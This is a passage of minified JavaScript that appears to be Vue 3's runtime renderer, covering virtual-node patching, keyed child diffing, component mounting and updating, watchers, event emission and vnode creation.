    for (let j = 0; j < f.length; j++) {
      const S = d[j], _ = f[j], N = (
        // oldVNode may be an errored async setup() component inside Suspense
        // which will not have a mounted element
        S.el && // - In the case of a Fragment, we need to provide the actual parent
        // of the Fragment itself so it can move its children.
        (S.type === ne || // - In the case of different nodes, there is going to be a replacement
        // which also requires the correct parent container
        !qt(S, _) || // - In the case of a component, it could contain anything.
        S.shapeFlag & 198) ? p(S.el) : (
          // In other cases, the parent container is not actually used so we
          // just pass the block element here to avoid a DOM parentNode call.
          v
        )
      );
      b(
        S,
        _,
        N,
        null,
        w,
        y,
        k,
        T,
        !0
      );
    }
  }, ie = (d, f, v, w, y) => {
    if (f !== v) {
      if (f !== te)
        for (const k in f)
          !Qt(k) && !(k in v) && n(
            d,
            k,
            f[k],
            null,
            y,
            w
          );
      for (const k in v) {
        if (Qt(k)) continue;
        const T = v[k], j = f[k];
        T !== j && k !== "value" && n(d, k, j, T, y, w);
      }
      "value" in v && n(d, "value", f.value, v.value, y);
    }
  }, de = (d, f, v, w, y, k, T, j, S) => {
    const _ = f.el = d ? d.el : a(""), N = f.anchor = d ? d.anchor : a("");
    let { patchFlag: $, dynamicChildren: z, slotScopeIds: D } = f;
    D && (j = j ? j.concat(D) : D), d == null ? (o(_, v, w), o(N, v, w), K(
      // #10007
      // such fragment like `<></>` will be compiled into
      // a fragment which doesn't have a children.
      // In this case fallback to an empty array
      f.children || [],
      v,
      N,
      y,
      k,
      T,
      j,
      S
    )) : $ > 0 && $ & 64 && z && // #2715 the previous fragment could've been a BAILed one as a result
    // of renderSlot() with no valid children
    d.dynamicChildren ? (Q(
      d.dynamicChildren,
      z,
      v,
      y,
      k,
      T,
      j
    ), // #2080 if the stable fragment has a key, it's a <template v-for> that may
    //  get moved around. Make sure all root level vnodes inherit el.
    // #2134 or if it's a component root, it may also get moved around
    // as the component is being moved.
    (f.key != null || y && f === y.subTree) && Yn(
      d,
      f,
      !0
      /* shallow */
    )) : U(
      d,
      f,
      v,
      N,
      y,
      k,
      T,
      j,
      S
    );
  }, ge = (d, f, v, w, y, k, T, j, S) => {
    f.slotScopeIds = j, d == null ? f.shapeFlag & 512 ? y.ctx.activate(
      f,
      v,
      w,
      T,
      S
    ) : Se(
      f,
      v,
      w,
      y,
      k,
      T,
      S
    ) : Ie(d, f, S);
  }, Se = (d, f, v, w, y, k, T) => {
    const j = d.component = xl(
      d,
      w,
      y
    );
    if (Rn(d) && (j.ctx.renderer = kt), vl(j, !1, T), j.asyncDep) {
      if (y && y.registerDep(j, Z, T), !d.el) {
        const S = j.subTree = Ke(vt);
        I(null, S, f, v), d.placeholder = S.el;
      }
    } else
      Z(
        j,
        d,
        f,
        v,
        y,
        k,
        T
      );
  }, Ie = (d, f, v) => {
    const w = f.component = d.component;
    if (cl(d, f, v))
      if (w.asyncDep && !w.asyncResolved) {
        V(w, f, v);
        return;
      } else
        w.next = f, w.update();
    else
      f.el = d.el, w.vnode = f;
  }, Z = (d, f, v, w, y, k, T) => {
    const j = () => {
      if (d.isMounted) {
        let { next: $, bu: z, u: D, parent: J, vnode: re } = d;
        {
          const We = Xn(d);
          if (We) {
            $ && ($.el = re.el, V(d, $, T)), We.asyncDep.then(() => {
              d.isUnmounted || j();
            });
            return;
          }
        }
        let X = $, Te;
        _t(d, !1), $ ? ($.el = re.el, V(d, $, T)) : $ = re, z && Pr(z), (Te = $.props && $.props.onVnodeBeforeUpdate) && Ue(Te, J, $, re), _t(d, !0);
        const $e = hs(d), He = d.subTree;
        d.subTree = $e, b(
          He,
          $e,
          // parent may have changed if it's in a teleport
          p(He.el),
          // anchor may have changed if it's in a fragment
          Et(He),
          d,
          y,
          k
        ), $.el = $e.el, X === null && ul(d, $e.el), D && Oe(D, y), (Te = $.props && $.props.onVnodeUpdated) && Oe(
          () => Ue(Te, J, $, re),
          y
        );
      } else {
        let $;
        const { el: z, props: D } = f, { bm: J, m: re, parent: X, root: Te, type: $e } = d, He = rr(f);
        _t(d, !1), J && Pr(J), !He && ($ = D && D.onVnodeBeforeMount) && Ue($, X, f), _t(d, !0);
        {
          Te.ce && // @ts-expect-error _def is private
          Te.ce._def.shadowRoot !== !1 && Te.ce._injectChildStyle($e);
          const We = d.subTree = hs(d);
          b(
            null,
            We,
            v,
            w,
            d,
            y,
            k
          ), f.el = We.el;
        }
        if (re && Oe(re, y), !He && ($ = D && D.onVnodeMounted)) {
          const We = f;
          Oe(
            () => Ue($, X, We),
            y
          );
        }
        (f.shapeFlag & 256 || X && rr(X.vnode) && X.vnode.shapeFlag & 256) && d.a && Oe(d.a, y), d.isMounted = !0, f = v = w = null;
      }
    };
    d.scope.on();
    const S = d.effect = new bn(j);
    d.scope.off();
    const _ = d.update = S.run.bind(S), N = d.job = S.runIfDirty.bind(S);
    N.i = d, N.id = d.uid, S.scheduler = () => Uo(N), _t(d, !0), _();
  }, V = (d, f, v) => {
    f.component = d;
    const w = d.vnode.props;
    d.vnode = f, d.next = null, Ji(d, f.props, w, v), Yi(d, f.children, v), it(), ls(d), lt();
  }, U = (d, f, v, w, y, k, T, j, S = !1) => {
    const _ = d && d.children, N = d ? d.shapeFlag : 0, $ = f.children, { patchFlag: z, shapeFlag: D } = f;
    if (z > 0) {
      if (z & 128) {
        je(
          _,
          $,
          v,
          w,
          y,
          k,
          T,
          j,
          S
        );
        return;
      } else if (z & 256) {
        Ce(
          _,
          $,
          v,
          w,
          y,
          k,
          T,
          j,
          S
        );
        return;
      }
    }
    D & 8 ? (N & 16 && dt(_, y, k), $ !== _ && c(v, $)) : N & 16 ? D & 16 ? je(
      _,
      $,
      v,
      w,
      y,
      k,
      T,
      j,
      S
    ) : dt(_, y, k, !0) : (N & 8 && c(v, ""), D & 16 && K(
      $,
      v,
      w,
      y,
      k,
      T,
      j,
      S
    ));
  }, Ce = (d, f, v, w, y, k, T, j, S) => {
    d = d || Ft, f = f || Ft;
    const _ = d.length, N = f.length, $ = Math.min(_, N);
    let z;
    for (z = 0; z < $; z++) {
      const D = f[z] = S ? bt(f[z]) : qe(f[z]);
      b(
        d[z],
        D,
        v,
        null,
        y,
        k,
        T,
        j,
        S
      );
    }
    _ > N ? dt(
      d,
      y,
      k,
      !0,
      !1,
      $
    ) : K(
      f,
      v,
      w,
      y,
      k,
      T,
      j,
      S,
      $
    );
  }, je = (d, f, v, w, y, k, T, j, S) => {
    let _ = 0;
    const N = f.length;
    let $ = d.length - 1, z = N - 1;
    for (; _ <= $ && _ <= z; ) {
      const D = d[_], J = f[_] = S ? bt(f[_]) : qe(f[_]);
      if (qt(D, J))
        b(
          D,
          J,
          v,
          null,
          y,
          k,
          T,
          j,
          S
        );
      else
        break;
      _++;
    }
    for (; _ <= $ && _ <= z; ) {
      const D = d[$], J = f[z] = S ? bt(f[z]) : qe(f[z]);
      if (qt(D, J))
        b(
          D,
          J,
          v,
          null,
          y,
          k,
          T,
          j,
          S
        );
      else
        break;
      $--, z--;
    }
    if (_ > $) {
      if (_ <= z) {
        const D = z + 1, J = D < N ? f[D].el : w;
        for (; _ <= z; )
          b(
            null,
            f[_] = S ? bt(f[_]) : qe(f[_]),
            v,
            J,
            y,
            k,
            T,
            j,
            S
          ), _++;
      }
    } else if (_ > z)
      for (; _ <= $; )
        pe(d[_], y, k, !0), _++;
    else {
      const D = _, J = _, re = /* @__PURE__ */ new Map();
      for (_ = J; _ <= z; _++) {
        const Pe = f[_] = S ? bt(f[_]) : qe(f[_]);
        Pe.key != null && re.set(Pe.key, _);
      }
      let X, Te = 0;
      const $e = z - J + 1;
      let He = !1, We = 0;
      const Ut = new Array($e);
      for (_ = 0; _ < $e; _++) Ut[_] = 0;
      for (_ = D; _ <= $; _++) {
        const Pe = d[_];
        if (Te >= $e) {
          pe(Pe, y, k, !0);
          continue;
        }
        let Je;
        if (Pe.key != null)
          Je = re.get(Pe.key);
        else
          for (X = J; X <= z; X++)
            if (Ut[X - J] === 0 && qt(Pe, f[X])) {
              Je = X;
              break;
            }
        Je === void 0 ? pe(Pe, y, k, !0) : (Ut[Je - J] = _ + 1, Je >= We ? We = Je : He = !0, b(
          Pe,
          f[Je],
          v,
          null,
          y,
          k,
          T,
          j,
          S
        ), Te++);
      }
      const ts = He ? el(Ut) : Ft;
      for (X = ts.length - 1, _ = $e - 1; _ >= 0; _--) {
        const Pe = J + _, Je = f[Pe], rs = f[Pe + 1], os = Pe + 1 < N ? (
          // #13559, fallback to el placeholder for unresolved async component
          rs.el || rs.placeholder
        ) : w;
        Ut[_] === 0 ? b(
          null,
          Je,
          v,
          os,
          y,
          k,
          T,
          j,
          S
        ) : He && (X < 0 || _ !== ts[X] ? fe(Je, v, os, 2) : X--);
      }
    }
  }, fe = (d, f, v, w, y = null) => {
    const { el: k, type: T, transition: j, children: S, shapeFlag: _ } = d;
    if (_ & 6) {
      fe(d.component.subTree, f, v, w);
      return;
    }
    if (_ & 128) {
      d.suspense.move(f, v, w);
      return;
    }
    if (_ & 64) {
      T.move(d, f, v, kt);
      return;
    }
    if (T === ne) {
      o(k, f, v);
      for (let $ = 0; $ < S.length; $++)
        fe(S[$], f, v, w);
      o(d.anchor, f, v);
      return;
    }
    if (T === fo) {
      F(d, f, v);
      return;
    }
    if (w !== 2 && _ & 1 && j)
      if (w === 0)
        j.beforeEnter(k), o(k, f, v), Oe(() => j.enter(k), y);
      else {
        const { leave: $, delayLeave: z, afterLeave: D } = j, J = () => {
          d.ctx.isUnmounted ? s(k) : o(k, f, v);
        }, re = () => {
          k._isLeaving && k[wi](
            !0
            /* cancelled */
          ), $(k, () => {
            J(), D && D();
          });
        };
        z ? z(k, J, re) : re();
      }
    else
      o(k, f, v);
  }, pe = (d, f, v, w = !1, y = !1) => {
    const {
      type: k,
      props: T,
      ref: j,
      children: S,
      dynamicChildren: _,
      shapeFlag: N,
      patchFlag: $,
      dirs: z,
      cacheIndex: D
    } = d;
    if ($ === -2 && (y = !1), j != null && (it(), tr(j, null, v, d, !0), lt()), D != null && (f.renderCache[D] = void 0), N & 256) {
      f.ctx.deactivate(d);
      return;
    }
    const J = N & 1 && z, re = !rr(d);
    let X;
    if (re && (X = T && T.onVnodeBeforeUnmount) && Ue(X, f, d), N & 6)
      kr(d.component, v, w);
    else {
      if (N & 128) {
        d.suspense.unmount(v, w);
        return;
      }
      J && wt(d, null, f, "beforeUnmount"), N & 64 ? d.type.remove(
        d,
        f,
        v,
        kt,
        w
      ) : _ && // #5154
      // when v-once is used inside a block, setBlockTracking(-1) marks the
      // parent block with hasOnce: true
      // so that it doesn't take the fast path during unmount - otherwise
      // components nested in v-once are never unmounted.
      !_.hasOnce && // #1153: fast path should not be taken for non-stable (v-for) fragments
      (k !== ne || $ > 0 && $ & 64) ? dt(
        _,
        f,
        v,
        !1,
        !0
      ) : (k === ne && $ & 384 || !y && N & 16) && dt(S, f, v), w && yt(d);
    }
    (re && (X = T && T.onVnodeUnmounted) || J) && Oe(() => {
      X && Ue(X, f, d), J && wt(d, null, f, "unmounted");
    }, v);
  }, yt = (d) => {
    const { type: f, el: v, anchor: w, transition: y } = d;
    if (f === ne) {
      ut(v, w);
      return;
    }
    if (f === fo) {
      O(d);
      return;
    }
    const k = () => {
      s(v), y && !y.persisted && y.afterLeave && y.afterLeave();
    };
    if (d.shapeFlag & 1 && y && !y.persisted) {
      const { leave: T, delayLeave: j } = y, S = () => T(v, k);
      j ? j(d.el, k, S) : S();
    } else
      k();
  }, ut = (d, f) => {
    let v;
    for (; d !== f; )
      v = m(d), s(d), d = v;
    s(f);
  }, kr = (d, f, v) => {
    const { bum: w, scope: y, job: k, subTree: T, um: j, m: S, a: _ } = d;
    gs(S), gs(_), w && Pr(w), y.stop(), k && (k.flags |= 8, pe(T, d, f, v)), j && Oe(j, f), Oe(() => {
      d.isUnmounted = !0;
    }, f);
  }, dt = (d, f, v, w = !1, y = !1, k = 0) => {
    for (let T = k; T < d.length; T++)
      pe(d[T], f, v, w, y);
  }, Et = (d) => {
    if (d.shapeFlag & 6)
      return Et(d.component.subTree);
    if (d.shapeFlag & 128)
      return d.suspense.next();
    const f = m(d.anchor || d.el), v = f && f[yi];
    return v ? m(v) : f;
  };
  let Jt = !1;
  const wr = (d, f, v) => {
    d == null ? f._vnode && pe(f._vnode, null, null, !0) : b(
      f._vnode || null,
      d,
      f,
      null,
      null,
      null,
      v
    ), f._vnode = d, Jt || (Jt = !0, ls(), An(), Jt = !1);
  }, kt = {
    p: b,
    um: pe,
    m: fe,
    r: yt,
    mt: Se,
    mc: K,
    pc: U,
    pbc: Q,
    n: Et,
    o: e
  };
  return {
    render: wr,
    hydrate: void 0,
    createApp: Bi(wr)
  };
}
function uo({ type: e, props: t }, r) {
  return r === "svg" && e === "foreignObject" || r === "mathml" && e === "annotation-xml" && t && t.encoding && t.encoding.includes("html") ? void 0 : r;
}
function _t({ effect: e, job: t }, r) {
  r ? (e.flags |= 32, t.flags |= 4) : (e.flags &= -33, t.flags &= -5);
}
function Zi(e, t) {
  return (!e || e && !e.pendingBranch) && t && !t.persisted;
}
function Yn(e, t, r = !1) {
  const o = e.children, s = t.children;
  if (M(o) && M(s))
    for (let n = 0; n < o.length; n++) {
      const i = o[n];
      let a = s[n];
      a.shapeFlag & 1 && !a.dynamicChildren && ((a.patchFlag <= 0 || a.patchFlag === 32) && (a = s[n] = bt(s[n]), a.el = i.el), !r && a.patchFlag !== -2 && Yn(i, a)), a.type === to && // avoid cached text nodes retaining detached dom nodes
      a.patchFlag !== -1 && (a.el = i.el), a.type === vt && !a.el && (a.el = i.el);
    }
}
function el(e) {
  const t = e.slice(), r = [0];
  let o, s, n, i, a;
  const l = e.length;
  for (o = 0; o < l; o++) {
    const u = e[o];
    if (u !== 0) {
      if (s = r[r.length - 1], e[s] < u) {
        t[o] = s, r.push(o);
        continue;
      }
      for (n = 0, i = r.length - 1; n < i; )
        a = n + i >> 1, e[r[a]] < u ? n = a + 1 : i = a;
      u < e[r[n]] && (n > 0 && (t[o] = r[n - 1]), r[n] = o);
    }
  }
  for (n = r.length, i = r[n - 1]; n-- > 0; )
    r[n] = i, i = t[i];
  return r;
}
function Xn(e) {
  const t = e.subTree.component;
  if (t)
    return t.asyncDep && !t.asyncResolved ? t : Xn(t);
}
function gs(e) {
  if (e)
    for (let t = 0; t < e.length; t++)
      e[t].flags |= 8;
}
const tl = Symbol.for("v-scx"), rl = () => sr(tl);
function Ye(e, t, r) {
  return Qn(e, t, r);
}
function Qn(e, t, r = te) {
  const { immediate: o, deep: s, flush: n, once: i } = r, a = ye({}, r), l = t && o || !t && n !== "post";
  let u;
  if (pr) {
    if (n === "sync") {
      const g = rl();
      u = g.__watcherHandles || (g.__watcherHandles = []);
    } else if (!l) {
      const g = () => {
      };
      return g.stop = Xe, g.resume = Xe, g.pause = Xe, g;
    }
  }
  const c = _e;
  a.call = (g, h, b) => Ze(g, c, h, b);
  let p = !1;
  n === "post" ? a.scheduler = (g) => {
    Oe(g, c && c.suspense);
  } : n !== "sync" && (p = !0, a.scheduler = (g, h) => {
    h ? g() : Uo(g);
  }), a.augmentJob = (g) => {
    t && (g.flags |= 4), p && (g.flags |= 2, c && (g.id = c.uid, g.i = c));
  };
  const m = gi(e, t, a);
  return pr && (u ? u.push(m) : l && m()), m;
}
function ol(e, t, r) {
  const o = this.proxy, s = ce(e) ? e.includes(".") ? Zn(o, e) : () => o[e] : e.bind(o, o);
  let n;
  H(t) ? n = t : (n = t.handler, r = t);
  const i = yr(this), a = Qn(s, n.bind(o), r);
  return i(), a;
}
function Zn(e, t) {
  const r = t.split(".");
  return () => {
    let o = e;
    for (let s = 0; s < r.length && o; s++)
      o = o[r[s]];
    return o;
  };
}
const sl = (e, t) => t === "modelValue" || t === "model-value" ? e.modelModifiers : e[`${t}Modifiers`] || e[`${mt(t)}Modifiers`] || e[`${At(t)}Modifiers`];
function nl(e, t, ...r) {
  if (e.isUnmounted) return;
  const o = e.vnode.props || te;
  let s = r;
  const n = t.startsWith("update:"), i = n && sl(o, t.slice(7));
  i && (i.trim && (s = r.map((c) => ce(c) ? c.trim() : c)), i.number && (s = r.map(vo)));
  let a, l = o[a = so(t)] || // also try camelCase event handler (#2249)
  o[a = so(mt(t))];
  !l && n && (l = o[a = so(At(t))]), l && Ze(
    l,
    e,
    6,
    s
  );
  const u = o[a + "Once"];
  if (u) {
    if (!e.emitted)
      e.emitted = {};
    else if (e.emitted[a])
      return;
    e.emitted[a] = !0, Ze(
      u,
      e,
      6,
      s
    );
  }
}
const al = /* @__PURE__ */ new WeakMap();
function ea(e, t, r = !1) {
  const o = r ? al : t.emitsCache, s = o.get(e);
  if (s !== void 0)
    return s;
  const n = e.emits;
  let i = {}, a = !1;
  if (!H(e)) {
    const l = (u) => {
      const c = ea(u, t, !0);
      c && (a = !0, ye(i, c));
    };
    !r && t.mixins.length && t.mixins.forEach(l), e.extends && l(e.extends), e.mixins && e.mixins.forEach(l);
  }
  return !n && !a ? (se(e) && o.set(e, null), null) : (M(n) ? n.forEach((l) => i[l] = null) : ye(i, n), se(e) && o.set(e, i), i);
}
function eo(e, t) {
  return !e || !Wr(t) ? !1 : (t = t.slice(2).replace(/Once$/, ""), Y(e, t[0].toLowerCase() + t.slice(1)) || Y(e, At(t)) || Y(e, t));
}
function hs(e) {
  const {
    type: t,
    vnode: r,
    proxy: o,
    withProxy: s,
    propsOptions: [n],
    slots: i,
    attrs: a,
    emit: l,
    render: u,
    renderCache: c,
    props: p,
    data: m,
    setupState: g,
    ctx: h,
    inheritAttrs: b
  } = e, C = Nr(e);
  let I, R;
  try {
    if (r.shapeFlag & 4) {
      const O = s || o, B = O;
      I = qe(
        u.call(
          B,
          O,
          c,
          p,
          g,
          m,
          h
        )
      ), R = a;
    } else {
      const O = t;
      I = qe(
        O.length > 1 ? O(
          p,
          { attrs: a, slots: i, emit: l }
        ) : O(
          p,
          null
        )
      ), R = t.props ? a : il(a);
    }
  } catch (O) {
    nr.length = 0, Qr(O, e, 1), I = Ke(vt);
  }
  let F = I;
  if (R && b !== !1) {
    const O = Object.keys(R), { shapeFlag: B } = F;
    O.length && B & 7 && (n && O.some(Ro) && (R = ll(
      R,
      n
    )), F = Kt(F, R, !1, !0));
  }
  return r.dirs && (F = Kt(F, null, !1, !0), F.dirs = F.dirs ? F.dirs.concat(r.dirs) : r.dirs), r.transition && Go(F, r.transition), I = F, Nr(C), I;
}
const il = (e) => {
  let t;
  for (const r in e)
    (r === "class" || r === "style" || Wr(r)) && ((t || (t = {}))[r] = e[r]);
  return t;
}, ll = (e, t) => {
  const r = {};
  for (const o in e)
    (!Ro(o) || !(o.slice(9) in t)) && (r[o] = e[o]);
  return r;
};
function cl(e, t, r) {
  const { props: o, children: s, component: n } = e, { props: i, children: a, patchFlag: l } = t, u = n.emitsOptions;
  if (t.dirs || t.transition)
    return !0;
  if (r && l >= 0) {
    if (l & 1024)
      return !0;
    if (l & 16)
      return o ? ms(o, i, u) : !!i;
    if (l & 8) {
      const c = t.dynamicProps;
      for (let p = 0; p < c.length; p++) {
        const m = c[p];
        if (i[m] !== o[m] && !eo(u, m))
          return !0;
      }
    }
  } else
    return (s || a) && (!a || !a.$stable) ? !0 : o === i ? !1 : o ? i ? ms(o, i, u) : !0 : !!i;
  return !1;
}
function ms(e, t, r) {
  const o = Object.keys(t);
  if (o.length !== Object.keys(e).length)
    return !0;
  for (let s = 0; s < o.length; s++) {
    const n = o[s];
    if (t[n] !== e[n] && !eo(r, n))
      return !0;
  }
  return !1;
}
function ul({ vnode: e, parent: t }, r) {
  for (; t; ) {
    const o = t.subTree;
    if (o.suspense && o.suspense.activeBranch === e && (o.el = e.el), o === e)
      (e = t.vnode).el = r, t = t.parent;
    else
      break;
  }
}
const ta = (e) => e.__isSuspense;
function dl(e, t) {
  t && t.pendingBranch ? M(e) ? t.effects.push(...e) : t.effects.push(e) : xi(e);
}
const ne = Symbol.for("v-fgt"), to = Symbol.for("v-txt"), vt = Symbol.for("v-cmt"), fo = Symbol.for("v-stc"), nr = [];
let Ee = null;
function P(e = !1) {
  nr.push(Ee = e ? null : []);
}
function fl() {
  nr.pop(), Ee = nr[nr.length - 1] || null;
}
let fr = 1;
function xs(e, t = !1) {
  fr += e, e < 0 && Ee && t && (Ee.hasOnce = !0);
}
function ra(e) {
  return e.dynamicChildren = fr > 0 ? Ee || Ft : null, fl(), fr > 0 && Ee && Ee.push(e), e;
}
function A(e, t, r, o, s, n) {
  return ra(
    x(
      e,
      t,
      r,
      o,
      s,
      n,
      !0
    )
  );
}
function To(e, t, r, o, s) {
  return ra(
    Ke(
      e,
      t,
      r,
      o,
      s,
      !0
    )
  );
}
function oa(e) {
  return e ? e.__v_isVNode === !0 : !1;
}
function qt(e, t) {
  return e.type === t.type && e.key === t.key;
}
const sa = ({ key: e }) => e ?? null, Or = ({
  ref: e,
  ref_key: t,
  ref_for: r
}) => (typeof e == "number" && (e = "" + e), e != null ? ce(e) || le(e) || H(e) ? { i: Re, r: e, k: t, f: !!r } : e : null);
function x(e, t = null, r = null, o = 0, s = null, n = e === ne ? 0 : 1, i = !1, a = !1) {
  const l = {
    __v_isVNode: !0,
    __v_skip: !0,
    type: e,
    props: t,
    key: t && sa(t),
    ref: t && Or(t),
    scopeId: In,
    slotScopeIds: null,
    children: r,
    component: null,
    suspense: null,
    ssContent: null,
    ssFallback: null,
    dirs: null,
    transition: null,
    el: null,
    anchor: null,
    target: null,
    targetStart: null,
    targetAnchor: null,
    staticCount: 0,
    shapeFlag: n,
    patchFlag: o,
    dynamicProps: s,
    dynamicChildren: null,
    appContext: null,
    ctx: Re
  };
  return a ? (Xo(l, r), n & 128 && e.normalize(l)) : r && (l.shapeFlag |= ce(r) ? 8 : 16), fr > 0 && // avoid a block node from tracking itself
  !i && // has current parent block
  Ee && // presence of a patch flag indicates this node needs patching on updates.
  // component nodes also should always be patched, because even if the
  // component doesn't need to update, it needs to persist the instance on to
  // the next vnode so that it can be properly unmounted later.
  (l.patchFlag > 0 || n & 6) && // the EVENTS flag is only for hydration and if it is the only flag, the
  // vnode should not be considered dynamic due to handler caching.
  l.patchFlag !== 32 && Ee.push(l), l;
}
const Ke = pl;
function pl(e, t = null, r = null, o = 0, s = null, n = !1) {
  if ((!e || e === zi) && (e = vt), oa(e)) {
    const a = Kt(
      e,
      t,
      !0
      /* mergeRef: true */
    );
    return r && Xo(a, r), fr > 0 && !n && Ee && (a.shapeFlag & 6 ? Ee[Ee.indexOf(e)] = a : Ee.push(a)), a.patchFlag = -2, a;
  }
  if (_l(e) && (e = e.__vccOpts), t) {
    t = bl(t);
    let { class: a, style: l } = t;
    a && !ce(a) && (t.class = De(a)), se(l) && (Ho(l) && !M(l) && (l = ye({}, l)), t.style = qr(l));
  }
  const i = ce(e) ? 1 : ta(e) ? 128 : ki(e) ? 64 : se(e) ? 4 : H(e) ? 2 : 0;
  return x(
    e,
    t,
    r,
    o,
    s,
    i,
    n,
    !0
  );
}
function bl(e) {
  return e ? Ho(e) || Hn(e) ? ye({}, e) : e : null;
}
function Kt(e, t, r = !1, o = !1) {
  const { props: s, ref: n, patchFlag: i, children: a, transition: l } = e, u = t ? gl(s || {}, t) : s, c = {
    __v_isVNode: !0,
    __v_skip: !0,
    type: e.type,
    props: u,
    key: u && sa(u),
    ref: t && t.ref ? (
      // #2078 in the case of <component :is="vnode" ref="extra"/>
      // if the vnode itself already has a ref, cloneVNode will need to merge
      // the refs so the single vnode can be set on multiple refs
      r && n ? M(n) ? n.concat(Or(t)) : [n, Or(t)] : Or(t)
    ) : n,
    scopeId: e.scopeId,
    slotScopeIds: e.slotScopeIds,
    children: a,
    target: e.target,
    targetStart: e.targetStart,
    targetAnchor: e.targetAnchor,
    staticCount: e.staticCount,
    shapeFlag: e.shapeFlag,
    // if the vnode is cloned with extra props, we can no longer assume its
    // existing patch flag to be reliable and need to add the FULL_PROPS flag.
    // note: preserve flag for fragments since they use the flag for children
    // fast paths only.
    patchFlag: t && e.type !== ne ? i === -1 ? 16 : i | 16 : i,
    dynamicProps: e.dynamicProps,
    dynamicChildren: e.dynamicChildren,
    appContext: e.appContext,
    dirs: e.dirs,
    transition: l,
    // These should technically only be non-null on mounted VNodes. However,
    // they *should* be copied for kept-alive vnodes. So we just always copy
    // them since them being non-null during a mount doesn't affect the logic as
    // they will simply be overwritten.
    component: e.component,
    suspense: e.suspense,
    ssContent: e.ssContent && Kt(e.ssContent),
    ssFallback: e.ssFallback && Kt(e.ssFallback),
    placeholder: e.placeholder,
    el: e.el,
    anchor: e.anchor,
    ctx: e.ctx,
    ce: e.ce
  };
  return l && o && Go(
    c,
    l.clone(c)
  ), c;
}
function ze(e = " ", t = 0) {
  return Ke(to, null, e, t);
}
function L(e = "", t = !1) {
  return t ? (P(), To(vt, null, e)) : Ke(vt, null, e);
}
function qe(e) {
  return e == null || typeof e == "boolean" ? Ke(vt) : M(e) ? Ke(
    ne,
    null,
    // #3666, avoid reference pollution when reusing vnode
    e.slice()
  ) : oa(e) ? bt(e) : Ke(to, null, String(e));
}
function bt(e) {
  return e.el === null && e.patchFlag !== -1 || e.memo ? e : Kt(e);
}
function Xo(e, t) {
  let r = 0;
  const { shapeFlag: o } = e;
  if (t == null)
    t = null;
  else if (M(t))
    r = 16;
  else if (typeof t == "object")
    if (o & 65) {
      const s = t.default;
      s && (s._c && (s._d = !1), Xo(e, s()), s._c && (s._d = !0));
      return;
    } else {
      r = 32;
      const s = t._;
      !s && !Hn(t) ? t._ctx = Re : s === 3 && Re && (Re.slots._ === 1 ? t._ = 1 : (t._ = 2, e.patchFlag |= 1024));
    }
  else H(t) ? (t = { default: t, _ctx: Re }, r = 32) : (t = String(t), o & 64 ? (r = 16, t = [ze(t)]) : r = 8);
  e.children = t, e.shapeFlag |= r;
}
function gl(...e) {
  const t = {};
  for (let r = 0; r < e.length; r++) {
    const o = e[r];
    for (const s in o)
      if (s === "class")
        t.class !== o.class && (t.class = De([t.class, o.class]));
      else if (s === "style")
        t.style = qr([t.style, o.style]);
      else if (Wr(s)) {
        const n = t[s], i = o[s];
        i && n !== i && !(M(n) && n.includes(i)) && (t[s] = n ? [].concat(n, i) : i);
      } else s !== "" && (t[s] = o[s]);
  }
  return t;
}
function Ue(e, t, r, o = null) {
  Ze(e, t, 7, [
    r,
    o
  ]);
}
const hl = Vn();
let ml = 0;
function xl(e, t, r) {
  const o = e.type, s = (t ? t.appContext : e.appContext) || hl, n = {
    uid: ml++,
    vnode: e,
    type: o,
    parent: t,
    appContext: s,
    root: null,
    // to be immediately set
    next: null,
    subTree: null,
    // will be set synchronously right after creation
    effect: null,
    update: null,
    // will be set synchronously right after creation
    job: null,
    scope: new dn(
      !0
      /* detached */
    ),
    render: null,
    proxy: null,
    exposed: null,
    exposeProxy: null,
    withProxy: null,
    provides: t ? t.provides : Object.create(s.provides),
    ids: t ? t.ids : ["", 0, 0],
    accessCache: null,
    renderCache: [],
    // local resolved assets
    components: null,
    directives: null,
    // resolved props and emits options
    propsOptions: Jn(o, s),
    emitsOptions: ea(o, s),
    // emit
    emit: null,
    // to be set immediately
    emitted: null,
    // props default value
    propsDefaults: te,
    // inheritAttrs
    inheritAttrs: o.inheritAttrs,
    // state
    ctx: te,
    data: te,
    props: te,
    attrs: te,
    slots: te,
    refs: te,
    setupState: te,
    setupContext: null,
    // suspense related
    suspense: r,
    suspenseId: r ? r.pendingId : 0,
    asyncDep: null,
    asyncResolved: !1,
    // lifecycle hooks
    // not using enums here because it results in computed properties
    isMounted: !1,
    isUnmounted: !1,
    isDeactivated: !1,
    bc: null,
    c: null,
    bm: null,
    m: null,
    bu: null,
    u: null,
    um: null,
    bum: null,
    da: null,
    a: null,
    rtg: null,
    rtc: null,
    ec: null,
    sp: null
  };
  return n.ctx = { _: n }, n.root = t ? t.root : n, n.emit = nl.bind(null, n), e.ce && e.ce(n), n;
}
let _e = null;
const Qo = () => _e || Re;
let Dr, $o;
{
  const e = Gr(), t = (r, o) => {
    let s;
    return (s = e[r]) || (s = e[r] = []), s.push(o), (n) => {
      s.length > 1 ? s.forEach((i) => i(n)) : s[0](n);
    };
  };
  Dr = t(
    "__VUE_INSTANCE_SETTERS__",
    (r) => _e = r
  ), $o = t(
    "__VUE_SSR_SETTERS__",
    (r) => pr = r
  );
}
const yr = (e) => {
  const t = _e;
  return Dr(e), e.scope.on(), () => {
    e.scope.off(), Dr(t);
  };
}, vs = () => {
  _e && _e.scope.off(), Dr(null);
};
function na(e) {
  return e.vnode.shapeFlag & 4;
}
let pr = !1;
function vl(e, t = !1, r = !1) {
  t && $o(t);
  const { props: o, children: s } = e.vnode, n = na(e);
  Wi(e, o, n, t), qi(e, s, r || t);
  const i = n ? yl(e, t) : void 0;
  return t && $o(!1), i;
}
function yl(e, t) {
  const r = e.type;
  e.accessCache = /* @__PURE__ */ Object.create(null), e.proxy = new Proxy(e.ctx, Ri);
  const { setup: o } = r;
  if (o) {
    it();
    const s = e.setupContext = o.length > 1 ? wl(e) : null, n = yr(e), i = xr(
      o,
      e,
      0,
      [
        e.props,
        s
      ]
    ), a = tn(i);
    if (lt(), n(), (a || e.sp) && !rr(e) && zn(e), a) {
      if (i.then(vs, vs), t)
        return i.then((l) => {
          ys(e, l);
        }).catch((l) => {
          Qr(l, e, 0);
        });
      e.asyncDep = i;
    } else
      ys(e, i);
  } else
    aa(e);
}
function ys(e, t, r) {
  H(t) ? e.type.__ssrInlineRender ? e.ssrRender = t : e.render = t : se(t) && (e.setupState = $n(t)), aa(e);
}
function aa(e, t, r) {
  const o = e.type;
  e.render || (e.render = o.render || Xe);
  {
    const s = yr(e);
    it();
    try {
      Li(e);
    } finally {
      lt(), s();
    }
  }
}
const kl = {
  get(e, t) {
    return ve(e, "get", ""), e[t];
  }
